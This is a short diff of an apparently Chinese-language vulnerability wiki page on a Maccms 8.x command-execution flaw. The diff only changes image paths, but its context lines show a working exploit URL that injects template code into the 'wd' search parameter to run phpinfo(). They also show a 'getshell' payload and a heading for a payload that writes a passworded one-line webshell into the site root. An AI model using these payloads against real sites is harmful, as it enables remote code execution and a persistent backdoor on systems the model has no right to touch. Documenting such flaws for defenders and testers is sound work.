@@ -18,7 +18,7 @@ payload：
 
     http://0-sec.org/index.php?m=vod-search&wd={if-A:phpinfo()}{endif-A}
 
-![](/Users/aresx/Documents/VulWiki/.resource/Maccms8.x(苹果cms)命令执行漏洞/media/rId24.png)
+![](./.resource/Maccms8.x(苹果cms)命令执行漏洞/media/rId24.png)
 
 getshell payload（a）:
 
@@ -28,7 +28,7 @@ getshell payload（a）:
 
     a=phpinfo()
 
-![](/Users/aresx/Documents/VulWiki/.resource/Maccms8.x(苹果cms)命令执行漏洞/media/rId25.png)
+![](./.resource/Maccms8.x(苹果cms)命令执行漏洞/media/rId25.png)
 
 写入网站根目录一句话木马文件payload（文件名：test.php，密码：test）:
 
